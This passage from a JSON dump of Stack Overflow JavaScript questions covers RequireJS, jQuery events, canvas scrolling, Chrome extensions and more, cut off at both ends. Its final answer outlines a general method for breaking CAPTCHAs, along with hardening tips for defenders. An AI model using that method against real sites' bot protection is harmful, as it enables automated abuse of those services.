replace all instances of <code>'underscore'</code> with <code>'underscore.mixed'</code> in module definitions. I attempted moving Underscore into a file named <code>underscore.base.js</code> and making the regular <code>underscore</code> the mixer (like the Backbone setup) to avoid this step. Underscore, being a <em>named</em> module, disagreed with the plan.</p>\n",
                    "is_accepted": true,
                    "score": 17
                },
                {
                    "body": "<p>Battling with this for hours before i understand what i was doing wrong </p>\n\n<p>This is what i did wrong </p>\n\n<p>You should not rename the file underscore.string in main.js </p>\n\n<p>even though in my library i did rename the file in paths i name it back to 'underscore.string'</p>\n\n<p>This is how your <strong>main.js</strong> should look like</p>\n\n<pre><code>require.config({\npaths: {\n    underscore: 'lib/underscore', \n    'underscore.string' : 'lib/_string' ,\n},\nshim: { \n    underscore: {\n        exports: '_', \n        deps: [ 'jquery', 'jqueryui' ]\n    }, \n    'underscore.string': { \n        deps: [ 'underscore' ]\n    },\n} \n....\n</code></pre>\n\n<p>You could then either add it as <strong>dependency</strong> with in your shim like i did for my mixin file </p>\n\n<pre><code>shim: { \n    mixin : {\n        deps: [ 'jquery',  'underscore', 'underscore.string' , 'bootstrap'  ] \n    },  \n</code></pre>\n\n<p>Or just <strong>define</strong> it in your different pages like </p>\n\n<pre><code>/*global define */\ndefine([    \n    'underscore.string'\n], function ( ) {   \n</code></pre>\n\n<p>it just work now you can access it through _.str or _.string </p>\n\n<p>This is <strong>why</strong> you should do it this way and not try to name it something else </p>\n\n<p>on line 663 of underscore.string.js</p>\n\n<pre><code>  // Register as a named module with AMD.\n  if (typeof define === 'function' &amp;&amp; define.amd)\n    define('underscore.string', [], function(){ return _s; });\n</code></pre>\n\n<p>Which means that it will only register it with AMD require JS if you are defining 'underscore.string'</p>\n\n<p>For Mix in you could just with define </p>\n\n<pre><code> /*global define */\ndefine([     \n    'underscore',\n    'underscore.string'\n], function ( ) {   \n  _.mixin(_.str.exports());\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>What is the right way to execute code on Underscore when it gets loaded? I am trying to execute the below code to extend the _ exported namespace automatically when modules require it:</p>\n\n<pre><code>_.mixin(_.str.exports());\n</code></pre>\n\n<p>The docs are a bit vague but I think I put it in the shim init section? I tried the below but I can't even get a breakpoint to hit in the init:</p>\n\n<pre><code>require.config({\n    paths: {\n        jquery: 'libs/jquery/jquery.min',\n        underscore: 'libs/underscore/lodash.min',\n        underscorestring: 'libs/underscore/underscore.string.min'\n    },\n\n    shim: {\n        underscore: {\n            exports: '_'\n        }\n        underscorestring: {\n            deps: ['underscore'],\n            init: function (_) {\n                //Mixin plugin to namespace\n                _.mixin(_.str.exports());\n\n                return _;\n            }\n        }\n    }\n});\n</code></pre>\n\n<p>When I try to do this and use underscorestring, I get this error:</p>\n\n<blockquote>\n  <p>Uncaught TypeError: Object function s(e){return new o(e)} has no\n  method 'startsWith'</p>\n</blockquote>\n\n<p>Docs:</p>\n\n<ul>\n<li><a href=\"http://requirejs.org/docs/api.html#config-shim\">http://requirejs.org/docs/api.html#config-shim</a></li>\n<li><a href=\"http://requirejs.org/docs/api.html#config-callback\">http://requirejs.org/docs/api.html#config-callback</a></li>\n</ul>\n",
            "last_activity_date": 1414220919,
            "question_id": 13627376,
            "score": 11,
            "tags": [
                "javascript",
                "asynchronous",
                "requirejs",
                "underscore.js",
                "dynamic-script-loading"
            ],
            "title": "How to mixin Underscore plugins in RequireJS?"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>Use the <code>which</code> property of the event object. It should be <code>undefined</code> for code-triggered events:</p>\n\n<pre><code>$(\"#someElem\").click(function(e) {\n    if(e.which) {\n        //Actually clicked\n    }\n    else {\n        //Triggered by code\n    }\n});\n</code></pre>\n\n<p>Here's a <a href=\"http://jsfiddle.net/interdream/frw8j/\">working example</a> of the above.</p>\n\n<p><strong>Update</strong> based on comments</p>\n\n<p>Pressing the Enter key when an <code>input</code> element has focus can trigger the <code>click</code> event. If you want to distinguish between code-triggered clicks and all other clicks (mouse or keyboard triggered) then the above method should work fine.</p>\n",
                    "is_accepted": true,
                    "score": 12
                },
                {
                    "body": "<p>You should check e.originalEvent:</p>\n\n<pre><code>$(\"#someElem\").click(function(e) {\n    if(e.originalEvent === undefined) {\n        //triggered \n    }\n    else {\n        //clicked by user\n    }\n});\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 11
                },
                {
                    "body": "<p>Wait for some time and use <code>event.isTrusted</code> - its supported by IE9, Opera 12, and Firefox Nightly. Webkit will support it too, most probably.</p>\n\n<p>Currently, there is no guaranteed way to know.</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>How to detect if a click() is a mouse click or triggered by some code?</p>\n",
            "last_activity_date": 1360614700,
            "question_id": 7635274,
            "score": 11,
            "tags": [
                "javascript",
                "jquery"
            ],
            "title": "How to detect if a click() is a mouse click or triggered by some code?"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>You can compress the data with <a href=\"http://php.net/manual/en/book.outcontrol.php\">PHP\u2019s output control</a>. Just put this call at the start of your script before any output:</p>\n\n<pre><code>ob_start('ob_gzhandler');\n</code></pre>\n\n<p>Now any output will be compressed with either <em>gzip</em> or <em>deflate</em> if accepted by the client.</p>\n",
                    "is_accepted": true,
                    "score": 27
                },
                {
                    "body": "<p>In PHP 5.4 is now JSON_UNESCAPED_UNICODE so you can replace char:</p>\n\n<p>\\u00f3 -> \u0139\u203a = \u015a</p>\n\n<p>eq:</p>\n\n<pre><code> json_encode($data,JSON_UNESCAPED_UNICODE);\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>I'm writing a little analysis page which will help me hunt down bugs in an application. In essence it allows to visually compare actual data and log entries, plus perform a bit of analysis on the data.</p>\n\n<p>Since this is for debugging only and since I will be deploying this on the live site I want it to have as little server load as possible. Several of the analysis options will include rather heavy substring searching or n<sup>2</sup> operations, so I'm going to offload this to the client.</p>\n\n<p>This means that the PHP page will just take the data from the tables and logs, JSON some of it, and write it out. The client Javascript will then do all the analysis etc.</p>\n\n<p>The problem is that the JSON'ed data will be several MB large, and my connection to the server - slow. It would be nice to compress the data somehow. Anyone have ideas?</p>\n\n<p>The environment is PHP + Apache; I don't know if mod_gzip will be installed; and I have no control over it.</p>\n",
            "last_activity_date": 1343501086,
            "question_id": 2037349,
            "score": 11,
            "tags": [
                "php",
                "javascript",
                "json",
                "compression"
            ],
            "title": "How to compress JSON with PHP?"
        },
        {
            "answer_count": 5,
            "answers": [
                {
                    "body": "<p>Close your <code>if</code> paren...</p>\n",
                    "is_accepted": false,
                    "score": 9
                },
                {
                    "body": "<p>Try this:</p>\n\n<pre><code>ref.match(new RegExp(\"^http://(www\\\\.)?reddit\\\\.com/\", \"i\"))\n</code></pre>\n\n<p>Or:</p>\n\n<pre><code>ref.match(/^http:\\/\\/(www\\.)?reddit\\.com\\//i)\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Try this:</p>\n\n<pre><code>if (ref.match(/^https?:\\/\\/([^\\/]+\\.)?reddit\\.com(\\/|$)/i)) {\n  alert(\"Came from reddit\");\n}\n</code></pre>\n\n<p>The regexp:</p>\n\n<pre><code>/^           # ensure start of string\n http        # match 'http'\n s?          # 's' if it exists is okay\n :\\/\\/       # match '://'\n ([^\\/]+\\.)? # match any non '/' chars followed by a '.' (if they exist)\n reddit\\.com # match 'reddit.com'\n (\\/|$)      # match '/' or the end of the string\n/i           # match case-insenitive\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 36
                },
                {
                    "body": "<p>Use var ref = document.referer;\n// ONE R instead of TWO</p>\n",
                    "is_accepted": false,
                    "score": -3
                },
                {
                    "body": "<p>I've been using an alternative to RegEx by looking for the domain in the referrer</p>\n\n<pre><code>if (document.referrer.indexOf('reddit.com') &gt;= 0) { alert('They came from Reddit.com'); }\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
            "body": "<p>I'm using this to check if someone came from Reddit, however it doesn't work.</p>\n\n<pre><code>var ref = document.referrer;\nif(ref.match(\"/http://(www.)?reddit.com(/)?(.*)?/gi\"){\n    alert('You came from Reddit');\n}\nelse{\n    alert('No you didn\\'t');\n}\n</code></pre>\n\n<p>Suggestions on the regular expression are most welcome too ;)</p>\n",
            "last_activity_date": 1402679413,
            "question_id": 2031362,
            "score": 11,
            "tags": [
                "javascript",
                "referrer"
            ],
            "title": "Checking the referrer"
        },
        {
            "answer_count": 7,
            "answers": [
                {
                    "body": "<p>Javascript runs in a single-thread, so if you have massive Javascript calls, let say with librairies like ExtJS, it's normal that it can be slow.  You might however consider the following alternatives:</p>\n\n<p>First and foremost, try to optimize the code as much as you can.</p>\n\n<p>Then, you could use timers in Javascript to simulate asynchronous work.  Here is a good example on how to do this : <a href=\"http://ejohn.org/blog/how-javascript-timers-work/\">http://ejohn.org/blog/how-javascript-timers-work/</a></p>\n\n<p>If you want more information, here are some additional tips on how to attempt to reduce Javascript freezing time.</p>\n\n<p><a href=\"http://debuggable.com/posts/run-intense-js-without-freezing-the-browser:480f4dd6-f864-4f72-ae16-41cccbdd56cb\">http://debuggable.com/posts/run-intense-js-without-freezing-the-browser:480f4dd6-f864-4f72-ae16-41cccbdd56cb</a></p>\n\n<p>Good luck !</p>\n",
                    "is_accepted": true,
                    "score": 14
                },
                {
                    "body": "<p>I believe you can use Workers, but it seems to be implemented in FF3.5, but few other ones.</p>\n\n<p>See <a href=\"http://hacks.mozilla.org/2009/07/working-smarter-not-harder/\" rel=\"nofollow\">http://hacks.mozilla.org/2009/07/working-smarter-not-harder/</a></p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>When a page is loading it can only download 2 javascript files in parallel at any one time so trying to keeping the number of javascript files down and their size down (with Minification,obsfucation and GZipping) will help with the loading experience.</p>\n\n<p>Using callbacks in your javascript will also help with items being non-blocking when javascript is running.</p>\n\n<p>An example in jQuery would be</p>\n\n<pre><code>$('#id').click(function(){\n  $.post('url',data,function(callbackdata){//do something\n         });\n\n});\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>Quoting <a href=\"http://stackoverflow.com/questions/950280/javascript-being-loaded-asynchronously-in-firefox-3-according-to-firebug\">this answer</a>:</p>\n\n<blockquote>\n  <p>Javascript resource requests are\n  indeed blocking, but there are ways\n  around this (to wit: DOM injected\n  script tags in the head, and AJAX\n  requests) which without seeing the\n  page myself is likely to be what's\n  happening here.</p>\n  \n  <p>Including multiple copies of the same\n  JS resource is extremely bad but not\n  necessarily fatal, and is typical of\n  larger sites which might have been\n  accreted from the work of separate\n  teams, or just plain old bad coding,\n  planning, or maintenance.</p>\n  \n  <p>As far as yahoo's recommendation to\n  place scripts at the bottom of the\n  body, this improves percieved response\n  times, and can improve actual loading\n  times to a degree (because all the\n  previous resources are allowed to\n  async first), but it will never be as\n  effective as non-blocking requests\n  (though they come with a high barrier\n  of technical capability).</p>\n</blockquote>\n\n<p>You can take a look at a YUI blog entry about <a href=\"http://yuiblog.com/blog/2008/07/22/non-blocking-scripts/\" rel=\"nofollow\">Non-Blocking Javascript</a>.</p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p><a href=\"http://www.websiteoptimization.com/speed/tweak/defer/\" rel=\"nofollow\">Deferring execution of JavaScript</a> can be a really good solution if you have some JavaScript that is not critical to have loaded immediately.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>setTimeout with a small delay will allow your control flow to proceed while scheduling another function to execute later. This is especially useful to prevent the UI from blocking or being inadvertently dependent on the successful execution of the other function.</p>\n\n<p>I find it very useful to prevent javascript errors from interfering with bound events. For example, to install a submit handler on a form:</p>\n\n<pre><code>$('#form').submit(function() {\n  setTimeout(function() {\n    // Submit handler function, i.e. do an ajax submission of the form\n    $.ajax(...etc...);\n  }, 1);\n  // Return false before the handler executes, ensuring the form won't manually submit\n  // in the event of a js error in the handler\n  return false;\n});\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Have a look at this <a href=\"http://code.google.com/p/funky-jq-plugins/wiki/nonblocking\" rel=\"nofollow\">jQuery plugin</a> (http://code.google.com/p/funky-jq-plugins/wiki/nonblocking). </p>\n\n<p>It aims at using timers to emulate a multi-threaded environment where the UI thread is not frozen by demanding operations like iteration over long lists. Very cool stuff ... I wrote it :)</p>\n\n<p>Ciao for now</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I am wondering if it is possible to load javascript in a way in which it does not block the user experience. I am not sure how to achieve the same, but I am looking for a cross-browser solution. I am wondering if someone can guide me in the right direction. Placing the js at the bottom of the page does not work too well.</p>\n\n<p>Thank you for your time.</p>\n",
            "last_activity_date": 1337943132,
            "question_id": 1108225,
            "score": 11,
            "tags": [
                "javascript",
                "jquery"
            ],
            "title": "Non-blocking Javascript"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>Eureka! I was set upon the correct path by deven98602.</p>\n\n<p>The key to remember is that, if you're nesting multiple CompositeViews (or CollectionViews), each cascading level down will represent one unit of the set from its parent; that is, my <strong>SchedulerDetailCompositeView</strong> from before represents a single model from the collection in <strong>SchedulerCompositeView</strong>. Therefore, if I'm constructing nested CompositeViews (presumably based on deeply-nested data), I must redefine a collection on these cascaded children, as they only have a single model associated with them, and not a proper collection to render.</p>\n\n<p>That said, the updated <strong>SchedulerDetailCompositeView</strong> looks as such:</p>\n\n<pre><code>return Backbone.Marionette.CompositeView.extend({\n    template: Handlebars.compile(schedulerDetailCompositeViewTemplate),\n    itemView: SchedulerDetailItemView,\n    initialize: function () {\n        var Load = Backbone.Model.extend();\n\n        var LoadCollection = Backbone.Collection.extend({\n            model: Load\n        });\n\n        // this array of loads, nested within my JSON data, represents\n        //  a new collection to be rendered as models using SchedulerDetailItemView\n        var loadList = new LoadCollection(this.model.get(\"loads\"));\n\n        this.collection = loadList;\n    },\n    appendHtml: function (collectionView, itemView) {\n        collectionView.$(\"#schedulerDetailStops\").append(itemView.el);\n    }\n});\n</code></pre>\n\n<p>Once the collection is set, <code>appendHtml()</code> fires as expected and renders each new model in this newly-set collection.</p>\n",
                    "is_accepted": true,
                    "score": 14
                }
            ],
            "body": "<p>I'm getting into larger-scale data structures with Backbone, and coming across occasions where data would be well-represented via CompositeViews; that is, CollectionViews with the addition of \"added fluff\" around them, such as headers, buttons, and so on.</p>\n\n<p>However, I'm having a lot of difficulty nesting CompositeViews inside one another. Using the standard itemView property on a CompositeView to render another CompositeView doesn't seem to be firing at all.</p>\n\n<p>Assume I have a <strong>parent ItemView</strong>, instantiated as such (following <a href=\"http://lostechies.com/derickbailey/2012/04/05/composite-views-tree-structures-tables-and-more/\">Derick Bailey's example</a>; assume this top level is where the initial <code>fetch()</code> on the collection would be called):</p>\n\n<pre><code>var User = Backbone.Model.extend({});\n\nvar UserCollection = Backbone.Collection.extend({\n    model: User\n});\n\nvar userList = new UserCollection(userData);\n\nvar schedulerCompositeView = new SchedulerCompositeView({\n    collection: userList\n});\n\nschedulerCompositeView.render();\n\nthis.ui.schedulerWidget.html(schedulerCompositeView.el);\n</code></pre>\n\n<p>And <strong>SchedulerCompositeView</strong> looks as such:</p>\n\n<pre><code>return Backbone.Marionette.CompositeView.extend({\n    template: Handlebars.compile(schedulerCompositeViewTemplate),\n    itemView: SchedulerDetailCompositeView,\n    appendHtml: function (collectionView, itemView) {\n        collectionView.$(\"#schedulerGroups\").append(itemView.el);\n    }\n});\n</code></pre>\n\n<p>And finally, <strong>SchedulerDetailCompositeView</strong>:</p>\n\n<pre><code>return Backbone.Marionette.CompositeView.extend({\n    template: Handlebars.compile(schedulerDetailCompositeViewTemplate),\n    itemView: SchedulerDetailItemView,\n    appendHtml: function (collectionView, itemView) {\n        collectionView.$(\"#schedulerDetailStops\").append(itemView.el);\n    }\n});\n</code></pre>\n\n<p>SchedulerDetailCompositeView never gets instantiated; in fact, its <code>appendHtml()</code> method never seems to fire at all.</p>\n\n<p>Clearly there's some other information missing here; obviously the intent is to pass a collection/model to SchedulerDetailCompositeView, but I'm not really sure what the proper technique for doing so is, due to the nested CompositeViews.</p>\n\n<p>For reference, here's a rough mockup of the structure I'm trying to achieve; if there might be a better manner for reaching this goal than nested CompositeViews, I'm certainly all ears:</p>\n\n<p><a href=\"http://jsfiddle.net/KAWB8/\">http://jsfiddle.net/KAWB8/</a></p>\n",
            "last_activity_date": 1360141506,
            "question_id": 13575101,
            "score": 10,
            "tags": [
                "javascript",
                "jquery",
                "backbone.js",
                "marionette"
            ],
            "title": "How to handle nested CompositeView using Backbone.Marionette?"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>So you want a 500x500 canvas to display something (a game level) that is really 9000x500 or so.</p>\n\n<p>This is fine. What you do is think of the canvas as a \"viewport\" for a larger scene. You  translate the canvas (or everything else) to the appropriate spot and draw all of the relevant things at that spot.</p>\n\n<p>Here's an example:</p>\n\n<p><a href=\"http://jsfiddle.net/hKrrY/\">http://jsfiddle.net/hKrrY/</a></p>\n\n<p>Click on the canvas and hold down your left arrow key to see the scene go by while the red player dot stays \"still\".</p>\n\n<p>As you scroll by the 100x100 canvas, you are seeing objects that are being drawn at once-offscreen locations like (330,50). Translating the canvas brings them into view.</p>\n\n<hr>\n\n<p>I guess its worth mentioning that this is where making optimizations in a canvas starts to really matter. The example I gave above is a very simplistic way to make a viewport, and as your code progresses you're going to want to think more and more about what it is you're drawing and how much you're drawing. You'll want to avoid drawing objects that are completely offscreen, for instance, and if your game or app has a background that is 9000x500 you probably don't want to be drawing the entire thing every time!</p>\n\n<p>So the concept is the takeaway here, but you'll want to think very hard about how you implement it and how much work you are making the canvas do. If you end up with performance problems in your side-scrolling app, be sure to let us know :)</p>\n",
                    "is_accepted": true,
                    "score": 18
                },
                {
                    "body": "<p>I've always found it's more efficient to wrap your canvas in a div with the width and height of your viewport and the overflow set to hidden then just draw your whole canvas and scroll the div to where you where you want to view. </p>\n\n<p>So the html would be: </p>\n\n<pre><code>&lt;div id='wrapper' style='width: 200px; height: 200px'&gt;\n     &lt;canvas width='1000' height='1000'&gt;&lt;/canvas&gt;\n&lt;/div&gt;\n</code></pre>\n\n<p>and the javascript would be something like </p>\n\n<pre><code>function scrollWrapper(x, y){\n    var wrapper = document.getElementById('wrapper');  \n    wrapper.scrollTop = x;\n    wrapper.scrollLeft = y;\n}\n</code></pre>\n\n<p>Then just call the function with the x and y you want to view. you could wrap it in a setTimeout or something if you wanted to move there instead of just jumping there. </p>\n",
                    "is_accepted": false,
                    "score": 3
                }
            ],
            "body": "<p>Hey guys I was wondering how I could go about making a camera like view where I could scroll a level within a canvas element just like this - <a href=\"http://playbiolab.com/\">http://playbiolab.com/</a></p>\n",
            "last_activity_date": 1319750170,
            "question_id": 7909583,
            "score": 10,
            "tags": [
                "javascript",
                "html5",
                "canvas",
                "camera",
                "side-scroller"
            ],
            "title": "2D side scrolling camera view in html5"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>You might want to look into jQuery's take on this, since it's interesting.</p>\n\n<p>In addition to detecting the browser, they detect browser features:</p>\n\n<p><a href=\"http://api.jquery.com/jQuery.browser/\" rel=\"nofollow\">http://api.jquery.com/jQuery.browser/</a></p>\n\n<p><a href=\"http://api.jquery.com/jQuery.support/\" rel=\"nofollow\">http://api.jquery.com/jQuery.support/</a></p>\n\n<p>Also, keep in mind that some mobile users don't want to be redirected to the mobile-optimized device. I, for one, positively hate it when a site detects my iPad as a mobile device and sends me (without any possibility to override it) to a sloppy mobile site that I wouldn't even want to browse with an iPhone.</p>\n\n<p>iOS and Android devices, in general, will happily work with the standard site if it's coded properly. And other mobile phones are quickly dying.</p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>see below link, this will perfectly suitable for your need </p>\n\n<h2><a href=\"http://detectmobilebrowser.com\">http://detectmobilebrowser.com</a></h2>\n\n<p>below is one more script :</p>\n\n<h2><a href=\"http://detectmobilebrowsers.mobi\">http://detectmobilebrowsers.mobi</a></h2>\n",
                    "is_accepted": true,
                    "score": 23
                },
                {
                    "body": "<p>As far as only detecting and saving the data once, you can set a cookie to record the fact that you've already done the detection. Then the next time a page is loaded, check to see if the cookie exists -- if it doesn't, then call your detection function and record to the database. If you do find the cookie, then you know you've already collected the data and you can skip doing it again.</p>\n\n<p><a href=\"http://www.quirksmode.org/js/cookies.html\" rel=\"nofollow\">http://www.quirksmode.org/js/cookies.html</a></p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>Is there any script to check user agent then send and save that information to database on server?</p>\n\n<p>I'm making mobile website with 2 versions like <em>m.facebook.com</em> and <em>touch.facebook.com</em> and I want to redirect to different mobiles. and I use <strong>WURFL</strong> device detection.</p>\n\n<p>So for example m.html5version.com should be delivered to all HTML5 supported devices and <em>m.mobileversion.com</em> should deliver to all other mobiles.</p>\n\n<p>So i need a way to detect device and browser 1st time using any server-side or client-side method. when any user will open the website first time on device then an script should run once it should collect the information about device and browser and should save the information in my existing WURFL database , so next time when any user will come from same device then he will redirect to touch or mobile version of website depending on device.</p>\n\n<p>So only 1st time on 1st device I want to detect device and save the info.</p>\n\n<p>Is there any way to do this?</p>\n\n<p><strong>For example</strong> </p>\n\n<p>Android 1.6 doesn't have HTML5 support and still in use. So i want to redirect all Android 1.6 devices to <em>m.mobileversion.com</em> not to <em>touch.mobileversion.com</em> </p>\n\n<p>And in touch version of website I'm using HTML 5 tags like <code>&lt;header&gt;</code>, <code>&lt;footer&gt;</code>, <code>&lt;nav&gt;</code> etc which is not supported Android 1.6. So i want to detect the first device who will access the website from Android 1.6 device and because HTML5 is not supported in 1.6 so user agent should be saved in my database then I when next time any user will open the website in 1.6 it will redirect to lo-fi mobile version automatically, no detection should be needed 2nd time for any device.</p>\n",
            "last_activity_date": 1400848475,
            "question_id": 6081346,
            "score": 10,
            "tags": [
                "javascript",
                "jquery",
                "mobile-website",
                "mobile-devices",
                "wurfl"
            ],
            "title": "How to detect mobile device and get user agent info send and save that information to database on server, only once?"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>URL of a file inside an extenion folder has the following format:</p>\n\n<pre><code>chrome-extension://&lt;ID&gt;/topbar.html\n</code></pre>\n\n<p>You can get this path by running:</p>\n\n<pre><code>chrome.extension.getURL(\"topbar.html\")\n</code></pre>\n\n<p>Now if you try to do:</p>\n\n<pre><code>$('#topbar').load(chrome.extension.getURL(\"topbar.html\"));\n</code></pre>\n\n<p>it wouldn't let you because of cross-origin policy. Background pages don't have this limitation, so you would need to load HTML there and pass result to a content script:</p>\n\n<p><strong>content_script.js</strong>:</p>\n\n<pre><code>chrome.extension.sendRequest({cmd: \"read_file\"}, function(html){\n    $(\"#topbar\").html(html);\n});\n</code></pre>\n\n<p><strong>background.html</strong>:</p>\n\n<pre><code>chrome.extension.onRequest.addListener(function(request, sender, sendResponse) {\n    if(request.cmd == \"read_file\") {\n        $.ajax({\n            url: chrome.extension.getURL(\"topbar.html\"),\n            dataType: \"html\",\n            success: sendResponse\n        });\n    }\n})\n</code></pre>\n\n<p>In a real world you probably would read topbar.html only once and then reuse it.</p>\n",
                    "is_accepted": true,
                    "score": 16
                },
                {
                    "body": "<p>While the above solution does work, one thing to pay attention to is that you need to return true from the event handler so that the communication port can still be available after the $.ajax call succeeds. </p>\n\n<p>see below for more information.\n<a href=\"https://code.google.com/p/chromium/issues/detail?id=307034\" rel=\"nofollow\">https://code.google.com/p/chromium/issues/detail?id=307034</a></p>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
            "body": "<p>I'm trying to write a Chrome extension that will have a bar at the top of certain webpages.  If I have my content script like this:</p>\n\n<pre><code>$('body').prepend('&lt;div id=\"topbar\"&gt;&lt;h1&gt;test&lt;/h1&gt;&lt;/div&gt;');\n</code></pre>\n\n<p>everything looks good, but what I ultimately want is something like this:</p>\n\n<pre><code>$('body').prepend('&lt;div id=\"topbar\"&gt;&lt;/div&gt;');\n$('#topbar').load('topbar.html');\n\ntopbar.html:\n&lt;h1&gt;test&lt;/h1&gt;\n</code></pre>\n\n<p>When I change it to this, though, the webpage is clobbered.  Most of the content disappears, and I just end up seeing some of the ads.  I can't even see the 'test' header.  I've checked to make sure there's no other 'topbar' id on the page.  What's wrong?</p>\n",
            "last_activity_date": 1410960760,
            "question_id": 5643263,
            "score": 10,
            "tags": [
                "javascript",
                "jquery",
                "dom",
                "google-chrome-extension"
            ],
            "title": "Loading html into page element (chrome extension)"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>Changing</p>\n\n<pre><code>NSString *someHTML = [wView stringByEvaluatingJavaScriptFromString:@\"document.getElementsByClassName('box')[0]\"];   \n</code></pre>\n\n<p>to</p>\n\n<pre><code>NSString *someHTML = [wView stringByEvaluatingJavaScriptFromString:@\"document.getElementsByClassName('box')[0].innerHTML;\"];   \n</code></pre>\n\n<p>(added the .innerHTML)</p>\n\n<p>makes all the difference in the world . . . </p>\n",
                    "is_accepted": true,
                    "score": 17
                }
            ],
            "body": "<p>I'm stuck on getting some pretty basic JS to run in my UIWebView.  In the web view's delegate, I have :</p>\n\n<pre><code>- (void)webViewDidFinishLoad:(UIWebView *)wView {\n    NSString *someHTML = [wView stringByEvaluatingJavaScriptFromString:@\"document.getElementsByClassName('box')[0]\"];   \n    NSString *allHTML = [wView stringByEvaluatingJavaScriptFromString:@\"document.body.innerHTML\"];\n    NSLog(@\"someHTML: %@\", someHTML);\n    NSLog(@\"allHTML: %@\", allHTML);\n}\n</code></pre>\n\n<p>but when the method is invoked, someHTML is nil while allHTML contains the entire body of the HTML in the webview.</p>\n\n<p>I've run the JS in the Safari JS console and it works just fine (it finds a div of class 'box' so I know that its in the HTML)</p>\n\n<p>Any suggestions?</p>\n\n<p>More info:</p>\n\n<p>FWIW, result in each of the following is also nil</p>\n\n<pre><code>NSString *result = [self.webView stringByEvaluatingJavaScriptFromString: @\"document\"];\nNSLog (@\"1. result: %@\", result); //should log the document object?\n\nresult = [self.webView stringByEvaluatingJavaScriptFromString: @\"document.body\"];\nNSLog (@\"2. result: %@\", result); //should log the document body\n\nresult = [self.webView stringByEvaluatingJavaScriptFromString: @\"document.body.getElementsByClassName\"];\nNSLog (@\"3. result: %@\", result); //should log a function\n\nresult = [self.webView stringByEvaluatingJavaScriptFromString: @\"document.body.getElementsByClassName('box')[0]\"];\nNSLog (@\"4. result: %@\", result); //should log the node\n</code></pre>\n",
            "last_activity_date": 1293694231,
            "question_id": 4560576,
            "score": 10,
            "tags": [
                "javascript",
                "iphone",
                "uiwebview",
                "uiwebviewdelegate"
            ],
            "title": "UIWebView stringByEvaluatingJavaScriptFromString"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>See:</p>\n\n<p><strong><a href=\"http://ejohn.org/blog/ocr-and-neural-nets-in-javascript/\">OCR and Neural Nets in JavaScript</a></strong></p>\n\n<p>Here <strong>John Resig</strong> (creator of <a href=\"http://jquery.org\">JQuery</a> javascript library) explains how exactly it is been done.</p>\n",
                    "is_accepted": true,
                    "score": 6
                },
                {
                    "body": "<p>Take a look at <a href=\"http://caca.zoy.org/wiki/PWNtcha\" rel=\"nofollow\">PWNtcha</a></p>\n\n<p>You can also read <a href=\"http://www.cs.sfu.ca/~mori/research/gimpy/\" rel=\"nofollow\">Breaking a Visual CAPTCHA</a></p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>I'm an image processing specialist and CAPTCHA decoder, I've done many CAPTCHA resolving projects before.</p>\n\n<p>OK, let's start CAPTCHA resolving steps!</p>\n\n<p>Decoding any kind off CAPTCHA has 3 main steps:</p>\n\n<h3>1- Removing background</h3>\n\n<p>Clear the CAPTCHA from any noise (using any image processing methods).</p>\n\n<p><em>Note for captcha decoding fighter: If you want to have a good CAPTCHA, you should add a stronger noise. Use random noised background that has similar color of characters.</em></p>\n\n<h3>2- Splitting characters</h3>\n\n<p>Easy step when they are separate and very hard when they're not.</p>\n\n<p>*Note for captcha decoding fighter: If you want to have a good CAPTCHA, don't leave the character separate! Make them overlapping, do NOT use different colors for characters, decoders can split the characters very easily! (most of the developers are unaware of this and think it's better to use a colorful CAPTCHA!), the best one is making an overlapping string with black color. For an experienced CAPTCHA decoder, it's not a problem to decode a colorful CAPTCHA! It's just beautiful and not useful! :) Use random curved lines witch connect all characters to each other. *</p>\n\n<h3>3- Converting separate images into character</h3>\n\n<p>After separation, we have a character set, (we don't have any string now, just have images and pixels), we should convert character images into string, But how?!\nThere are several ways, if they are not rotated, and have fixed font and size (such as freeglobes CAPTCHA), you can define a pattern set, your program should loop throw the patters to find the best match for each image, if the characters is very different and needs a large pattern you should use a \"Neural Network\" to recognize the character. A neural network for CAPTCHA resolving, will takes a character, and we say the network what this character is, for example, we will give it an image of \"A\" and we tel the NN: it's \"A\"! , then it will \"LEARN\" this character and will save its learning into a database, This procedure called \"TRAINING\". So, when we ask a trained network for a new character again, it will return us the best match from it's learning database. \nUsually decoder specialists use the CAPTCHA itself to train the neural network. Be careful! <strong>Using appropriate data for training can make or break your results.</strong></p>\n\n<p><em>Note for captcha decoding fighter: If you want to have a good CAPTCHA, use any method witch a decoder can't recognize the characters, even with a Neural network. Deform the characters randomly, use many fonts instead of one and rotate the characters as well, etc.</em></p>\n\n<p>Finally, we concatenate all single characters into one and return it as result.</p>\n\n<p>Unfortunately, there are no fixed algorithm for solving any CAPTCHA, it means, new CAPTCHA needs new analysis and training. You can't make a CAPTCHA decoder to decode all CAPTCHA.</p>\n\n<p>What should you know before starting:</p>\n\n<p><strong>1- Image processing 